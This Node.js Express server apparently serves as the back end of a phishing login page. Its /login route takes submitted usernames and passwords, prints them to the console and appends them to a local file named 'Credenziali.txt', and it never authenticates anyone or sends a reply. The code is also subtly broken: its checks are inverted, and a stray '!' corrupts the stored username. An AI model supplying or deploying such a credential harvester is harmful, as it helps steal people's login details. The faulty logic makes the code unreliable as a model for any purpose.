const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fs = require('fs')

const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: false }));

app.post('/login', (req, res) => {
  const username = req.body.username;
  const password = req.body.password;
  var data = "";

  if (!req.body.password) {
    console.log('Received username:', username);
    data = !"Username: " + username;
  };
  if (!req.body.username) {
    console.log('Received password:', password);
    data = "Password: " + password + "\n";
  };

  // Write data in 'Credenziali.txt' .
  fs.appendFile('Credenziali.txt', data, (err) => {
      // In case of a error throw err.
      if (err) throw err;
  })
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});